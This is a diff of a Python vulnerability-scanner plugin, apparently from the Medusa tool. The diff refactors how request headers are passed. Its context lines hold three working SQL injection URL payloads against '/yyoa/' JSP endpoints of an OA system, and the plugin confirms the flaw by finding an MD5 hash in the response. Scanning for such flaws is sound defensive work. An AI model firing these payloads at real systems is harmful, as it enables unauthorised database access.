@@ -29,7 +29,7 @@ def UrlProcessing(url):
 payloads = ["/yyoa/HJ/iSignatureHtmlServer.jsp?COMMAND=DELESIGNATURE&DOCUMENTID=1&SIGNATUREID=2%27AnD%20(SeLeCt%201%20FrOm%20(SeLeCt%20CoUnT(*),CoNcaT(Md5(1234),FlOoR(RaNd(0)*2))x%20FrOm%20InFoRmAtIoN_ScHeMa.TaBlEs%20GrOuP%20By%20x)a)%23",
                     "/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=-1'UnIoN%20AlL%20SeLeCt%20NULL,Md5(1234),NULL,NULL%23",
                     "/yyoa/ext/trafaxserver/SendFax/resend.jsp?fax_ids=(1)%20AnD%201=2%20UnIon%20SeLeCt%20Md5(1234)%20--"]
-def medusa(Url,RandomAgent,proxies=None,**kwargs):
+def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
     proxies=ClassCongregation.Proxies().result(proxies)
     scheme, url, port = UrlProcessing(Url)
     if port is None and scheme == 'https':
@@ -42,12 +42,8 @@ def medusa(Url,RandomAgent,proxies=None,**kwargs):
     for payload in payloads:
         try:
             payload_url = scheme+"://"+url+ ':' + str(port)+payload
-            headers = {
-                'Accept-Encoding': 'gzip, deflate',
-                'Accept': '*/*',
-                'User-Agent': RandomAgent,
-            }
-            resp = requests.get(payload_url,headers=headers,proxies=proxies, timeout=5, verify=False)
+
+            resp = requests.get(payload_url,headers=Headers,proxies=proxies, timeout=5, verify=False)
             con = resp.text
             code = resp.status_code
             if  con.lower().find('81dc9bdb52d04dc20036dbd8313ed055')!=-1:
